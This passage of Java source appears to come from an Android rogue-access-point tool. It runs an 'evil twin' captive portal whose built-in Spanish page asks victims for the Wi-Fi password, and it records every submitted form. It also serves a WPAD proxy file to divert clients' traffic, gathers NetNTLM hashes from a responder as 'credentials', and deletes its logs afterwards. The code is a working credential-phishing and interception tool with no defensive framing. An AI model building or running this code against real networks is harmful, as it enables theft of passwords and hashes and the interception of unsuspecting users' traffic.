            .put("bssid_cloned",false).put("cryptographic_validation",false);
        if(bytes>0&&bytes<=120000)result.put("pcap_base64",Base64.encodeToString(mergePcap(pcaps),Base64.NO_WRAP));
        for(File f:pcaps)f.delete();deny.delete();hostapdLog.delete();dnsLog.delete();ntlmLog.delete();ntlmFile.delete();new File(BASE,"ap-sniff.log").delete();
        return result;
    }
    private static long totalBytes(ArrayList<File> files){long total=0;for(File f:files)total+=Math.max(0,f.length()-24);return total+24;}
    private static int totalPackets(ArrayList<File> files){int total=0;for(File f:files)total+=packets(f);return total;}
    /** Concatenates pcap segments: keep one file header, append every record. */
    private static byte[] mergePcap(ArrayList<File> files)throws Exception {
        java.io.ByteArrayOutputStream out=new java.io.ByteArrayOutputStream();
        boolean first=true;
        for(File f:files){
            if(!f.isFile()||f.length()<24)continue;
            try(java.io.DataInputStream in=new java.io.DataInputStream(new java.io.FileInputStream(f))){
                byte[] header=new byte[24];in.readFully(header);
                if(first){out.write(header);first=false;}
                byte[] buffer=new byte[8192];int n;
                while((n=in.read(buffer))>0)out.write(buffer,0,n);
            }
        }
        return out.size()<24?new byte[0]:out.toByteArray();
    }
    private static void write(File file,String value)throws Exception {try(FileOutputStream out=new FileOutputStream(file)){out.write(value.getBytes(StandardCharsets.UTF_8));out.getFD().sync();}}
    private static void writePlain(String path,String value)throws Exception {try(FileOutputStream out=new FileOutputStream(path)){out.write(value.getBytes(StandardCharsets.US_ASCII));}}
    private static void stopQuietly(java.lang.Process process){try{if(process!=null&&process.isAlive()){process.destroy();if(!process.waitFor(2,TimeUnit.SECONDS)){process.destroyForcibly();process.waitFor(1,TimeUnit.SECONDS);}}}catch(Exception ignored){}}
    private static int clients(File log){
        try{Matcher m=Pattern.compile("DHCPACK\\([^)]*\\)\\s+\\S+\\s+([0-9a-fA-F:]{17})").matcher(read(log.getPath()));
            java.util.HashSet<String> macs=new java.util.HashSet<>();while(m.find())macs.add(m.group(1).toLowerCase(Locale.US));return macs.size();}catch(Exception e){return 0;}
    }
    private static HashMap<String,String[]> leases(File log){
        HashMap<String,String[]> map=new HashMap<>();
        try{Matcher m=Pattern.compile("DHCPACK\\([^)]*\\)\\s+(\\S+)\\s+([0-9a-fA-F:]{17})(?:\\s+(\\S+))?").matcher(read(log.getPath()));
            while(m.find())map.put(m.group(2).toLowerCase(Locale.US),new String[]{m.group(1),m.group(3)==null?"":m.group(3)});}catch(Exception ignored){}
        return map;
    }
    /** Appends new NetNTLM captures from the responder as worker credentials. */
    private static int ntlmCaptures(File file,JSONArray credentials,JSONArray events,int seen){
        if(!file.isFile())return seen;
        int count=0;
        try(java.io.BufferedReader reader=new java.io.BufferedReader(new java.io.InputStreamReader(new java.io.FileInputStream(file),StandardCharsets.UTF_8))){
            String line;
            while((line=reader.readLine())!=null){
                count++;
                if(count<=seen||line.trim().isEmpty())continue;
                try{
                    JSONObject o=new JSONObject(line);
                    while(credentials.length()>=50)credentials.remove(0);
                    credentials.put(new JSONObject().put("t",o.optLong("t")).put("ip",o.optString("ip")).put("proto",o.optString("proto")).put("user",o.optString("user")).put("kind",o.optString("kind")).put("data",o.optString("hash")));
                    event(events,o.optString("kind","ntlm")+" · "+o.optString("user")+" @ "+o.optString("ip")+" ("+o.optString("proto")+")");
                }catch(Exception ignored){}
            }
        }catch(Exception ignored){}
        return count;
    }
    private static void event(JSONArray events,String text){
        try{events.put(new JSONObject().put("t",System.currentTimeMillis()).put("text",text));while(events.length()>12)events.remove(0);}catch(Exception ignored){}
    }
    private static int packets(File file){
        try{if(!file.isFile()||file.length()<24)return 0;
            try(RandomAccessFile in=new RandomAccessFile(file,"r")){byte[] header=new byte[24];in.readFully(header);boolean little=(header[0]&255)==0xd4;long length=in.length();byte[] meta=new byte[16];int count=0;
                while(length-in.getFilePointer()>=16){in.readFully(meta);int size=little?(meta[8]&255)|(meta[9]&255)<<8|(meta[10]&255)<<16|(meta[11]&255)<<24:(meta[11]&255)|(meta[10]&255)<<8|(meta[9]&255)<<16|(meta[8]&255)<<24;
                    if(size<0||size>262144||length-in.getFilePointer()<size)break;in.seek(in.getFilePointer()+size);if(++count>=200000)break;}return count;}
        }catch(Exception e){return 0;}
    }
    interface Packet {void accept(byte[] bytes,byte[] record)throws Exception;}
    /** Minimal HTTP captive portal: serves one static template, answers the OS
     *  connectivity probes with a redirect and records form submissions. */
    static final class PortalServer implements Closeable {
        private static final String BUILTIN="<!doctype html><html><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><title>Wi-Fi</title></head><body style='margin:0;font-family:sans-serif;background:#0f1112;color:#eee;display:flex;min-height:100vh;align-items:center;justify-content:center'><form method=post action=check.php style='background:#1d1f20;padding:26px;border-radius:14px;width:min(360px,88vw)'><h1 style='font-size:20px'>Wi-Fi</h1><p style='color:#a4a7a9'>Introduce la contraseña de la red.</p><input name=password type=password placeholder=Contraseña style='padding:12px;width:100%;box-sizing:border-box;background:#101112;border:1px solid #303234;color:#eee;border-radius:8px'><br><br><button style='padding:13px;width:100%;border:0;border-radius:8px;font-weight:600'>Conectar</button></form></body></html>";
        private final ServerSocket server,secure;private final File root;private final JSONArray captured,events;private final boolean wpad;private volatile boolean running=true;
        PortalServer(String bind,String template,JSONArray captured,JSONArray events,boolean wpad)throws Exception{
            File dir=new File(BASE+"/portal/"+template);root=dir.isDirectory()?dir.getCanonicalFile():null;
            server=bind(bind,80);secure=bind(bind,443);
            this.captured=captured;this.events=events;this.wpad=wpad;
            Thread t1=new Thread(()->loop(server,80),"lambda-portal-80");t1.setDaemon(true);t1.start();
            Thread t2=new Thread(()->loop(secure,443),"lambda-portal-443");t2.setDaemon(true);t2.start();
        }
        private static ServerSocket bind(String host,int port)throws Exception{
            ServerSocket s=new ServerSocket();s.setReuseAddress(true);s.bind(new InetSocketAddress(InetAddress.getByName(host),port));return s;
        }
        private void loop(ServerSocket listener,int port){
            while(running)try(Socket socket=listener.accept()){socket.setSoTimeout(4000);handle(socket,port);}catch(Exception e){if(running)try{Thread.sleep(150);}catch(Exception ignored){}}
        }
        private void handle(Socket socket,int port)throws Exception{
            BufferedInputStream in=new BufferedInputStream(socket.getInputStream());
            String ip=socket.getInetAddress().getHostAddress();
            event(events,"conn :"+port+" "+ip);
            String request=readLine(in);
            if(request==null||request.isEmpty()){socket.close();return;}
            if(!(request.startsWith("GET ")||request.startsWith("POST ")||request.startsWith("HEAD "))){
                // TLS ClientHello or junk: log the attempt, do not fake a TLS server.
                event(events,"tcp :"+port+" "+ip);socket.close();return;
            }
            String[] parts=request.split(" ");String method=parts[0];String raw=parts.length>1?parts[1]:"/";
            int length=0;String host="",header;
            while((header=readLine(in))!=null&&!header.isEmpty()){
                int c=header.indexOf(':');
                if(c>0){
                    String name=header.substring(0,c).trim(),value=header.substring(c+1).trim();
                    if(name.equalsIgnoreCase("Content-Length"))try{length=Integer.parseInt(value);}catch(Exception ignored){}
                    if(name.equalsIgnoreCase("Host"))host=value;
                }
            }
            byte[] body=new byte[Math.max(0,Math.min(length,8192))];int got=0;while(got<body.length){int n=in.read(body,got,body.length-got);if(n<0)break;got+=n;}
            OutputStream out=socket.getOutputStream();
            int q=raw.indexOf('?');String path=q>=0?raw.substring(0,q):raw;
            if(!path.matches("(?i).*\\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf)$"))
                event(events,"http "+method+" "+path+" "+ip+(host.isEmpty()?"":" host="+host)+(port!=80?" :"+port:""));
            try{
                if(wpad&&path.equalsIgnoreCase("/wpad.dat")){pac(out,method.equals("HEAD"));return;}
                if(method.equals("POST")){
                    String data=new String(body,0,got,StandardCharsets.UTF_8).trim();
                    if(!data.isEmpty()){
                        try{while(captured.length()>=50)captured.remove(0);
                            captured.put(new JSONObject().put("t",System.currentTimeMillis()).put("ip",ip).put("data",data.length()>600?data.substring(0,600):data));
                            event(events,"portal · "+ip+" · "+(data.length()>160?data.substring(0,160):data));}catch(Exception ignored){}
                    }
                    File error=root==null?null:new File(root,"error.html");
                    if(error!=null&&error.isFile())serve(out,error,false);else redirect(out,"/");
                    return;
                }
                // Classic captive HTTP: known template files are served, and
                // every other path (any vendor's connectivity check) redirects
                // to the portal so the OS opens the sign-in flow.
                File file=null;
                if(root!=null){
                    file=path.equals("/")||path.isEmpty()?new File(root,"index.html"):new File(root,path.substring(1));
                    if(!file.getCanonicalPath().startsWith(root.getCanonicalPath()))file=null;
                }
                if(file!=null&&file.isFile())serve(out,file,method.equals("HEAD"));
                else if(path.equals("/")||path.isEmpty()||root==null)served(out,BUILTIN);
                else redirect(out,"http://192.168.50.1/");
            }finally{socket.close();}
        }
        private static boolean probe(String path){
            return path.equals("/generate_204")||path.equals("/gen_204")||path.equals("/hotspot-detect.html")
                ||path.equals("/library/test/success.html")||path.equals("/connecttest.txt")||path.equals("/ncsi.txt")
                ||path.equals("/redirect")||path.equals("/success.txt")||path.startsWith("/canonical.html");
        }
        private static void redirect(OutputStream out,String location)throws IOException{
            out.write(("HTTP/1.1 302 Found\r\nLocation: "+location+"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n").getBytes(StandardCharsets.US_ASCII));out.flush();
        }
        private static void served(OutputStream out,String html)throws IOException{
            byte[] b=html.getBytes(StandardCharsets.UTF_8);
            out.write(("HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: "+b.length+"\r\nConnection: close\r\n\r\n").getBytes(StandardCharsets.US_ASCII));
            out.write(b);out.flush();
        }
        /** WPAD PAC for clients that ignore DHCP 252 and fetch it over port 80. */
        private static void pac(OutputStream out,boolean head)throws IOException{
            byte[] b="function FindProxyForURL(url, host) { return \"PROXY 192.168.50.1:3128; DIRECT\"; }\n".getBytes(StandardCharsets.US_ASCII);
            out.write(("HTTP/1.1 200 OK\r\nContent-Type: application/x-ns-proxy-autoconfig\r\nContent-Length: "+b.length+"\r\nConnection: close\r\n\r\n").getBytes(StandardCharsets.US_ASCII));
            if(!head)out.write(b);out.flush();
        }
        private static void serve(OutputStream out,File file,boolean head)throws IOException{
            String name=file.getName();
            String type=name.endsWith(".css")?"text/css":name.endsWith(".js")?"application/javascript":name.endsWith(".png")?"image/png"
                :name.endsWith(".jpg")||name.endsWith(".jpeg")?"image/jpeg":name.endsWith(".svg")?"image/svg+xml"
                :name.endsWith(".ico")?"image/x-icon":name.endsWith(".woff2")?"font/woff2":name.endsWith(".woff")?"font/woff":"text/html; charset=utf-8";
            out.write(("HTTP/1.1 200 OK\r\nContent-Type: "+type+"\r\nContent-Length: "+file.length()+"\r\nConnection: close\r\n\r\n").getBytes(StandardCharsets.US_ASCII));
            if(!head)try(java.io.FileInputStream in=new java.io.FileInputStream(file)){byte[] buffer=new byte[8192];int n;while((n=in.read(buffer))>0)out.write(buffer,0,n);}
            out.flush();
        }
        private static String readLine(BufferedInputStream in)throws IOException{
            java.io.ByteArrayOutputStream line=new java.io.ByteArrayOutputStream();int c;
            while((c=in.read())>=0){if(c=='\n')break;if(c!='\r')line.write(c);if(line.size()>4096)break;}
            if(c<0&&line.size()==0)return null;return line.toString("US-ASCII");
        }
        public void close(){running=false;try{server.close();}catch(Exception ignored){}try{secure.close();}catch(Exception ignored){}}
    }
    static final class PcapTail implements Closeable {
        final File file;RandomAccessFile in;byte[] header;int link;boolean little;
        PcapTail(File f){file=f;}
        int integer(byte[] b,int p){return little?(b[p]&255)|(b[p+1]&255)<<8|(b[p+2]&255)<<16|(b[p+3]&255)<<24:(b[p+3]&255)|(b[p+2]&255)<<8|(b[p+1]&255)<<16|(b[p]&255)<<24;}
        long timeNanos(byte[] record)throws IOException{long seconds=Integer.toUnsignedLong(integer(record,0)),micros=Integer.toUnsignedLong(integer(record,4));if(micros>=1000000)throw new IOException("invalid_pcap_time");return seconds*1_000_000_000L+micros*1000;}
        void drain(Packet consumer)throws Exception {
            if(in==null){if(file.length()<24)return;in=new RandomAccessFile(file,"r");header=new byte[24];in.readFully(header);little=(header[0]&255)==0xd4&&(header[1]&255)==0xc3;
                if(!little&&!((header[0]&255)==0xa1&&(header[1]&255)==0xb2))throw new IOException("unsupported_pcap");link=integer(header,20);if(link!=127&&link!=105)throw new IOException("monitor_linktype_required");}
            int count=0;
            while(in.length()-in.getFilePointer()>=16&&count++<4096){long pos=in.getFilePointer();byte[] meta=new byte[16];in.readFully(meta);int size=integer(meta,8);if(size<0||size>65536)throw new IOException("invalid_packet_size");if(in.length()-in.getFilePointer()<size){in.seek(pos);return;}
                byte[] b=new byte[size];in.readFully(b);byte[] record=new byte[16+size];System.arraycopy(meta,0,record,0,16);System.arraycopy(b,0,record,16,size);consumer.accept(b,record);}
        }
        public void close()throws IOException{if(in!=null)in.close();}
    }
}
